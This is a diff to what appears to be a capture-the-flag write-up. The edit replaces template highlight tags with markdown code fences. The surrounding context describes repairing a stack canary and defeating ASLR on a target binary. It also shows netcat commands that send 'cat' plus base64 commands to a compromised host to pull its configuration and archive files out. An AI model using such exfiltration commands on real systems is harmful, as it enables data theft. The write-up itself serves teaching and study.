@@ -362,7 +362,7 @@ int sgstatd(sd)
 		"jne sgnet_exit");
 	return 0;
 }
-{% endhighlight  %}
+```
 
 I must say that I liked this idea of introducing how to repair a stack canary without the process of leaking it (which is required for regular random canaries). Checking the binary with the "checksec" command of PEDA, I saw that it had no other protection mechanisms activated. Assuming that the system has ASLR activated, we just had to defeat that and repair the canary to exploit it.
 
@@ -386,7 +386,7 @@ echo "cat /gnome/www/files/gnome.conf | base64" | nc -l 55555 | base64 -d > gnom
 echo "cat /gnome/www/files/gnome_firmware_rel_notes.txt | base64" | nc -l 55555 | base64 -d > gnome_firmware_rel_notes.txt  
 echo "cat /gnome/www/files/sgnet.zip | base64" | nc -l 55555 | base64 -d > sgnet.zip  
 echo "cat /gnome/www/files/sniffer_hit_list.txt | base64" | nc -l 55555 | base64 -d > sniffer_hit_list.txt  
-{% endhighlight  %}
+```
 
 Now I created and sent the actual payload which consisted of the following parts:
 
